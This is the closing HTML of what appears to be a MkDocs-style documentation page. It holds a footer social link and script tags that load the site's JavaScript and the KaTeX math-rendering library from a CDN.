      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>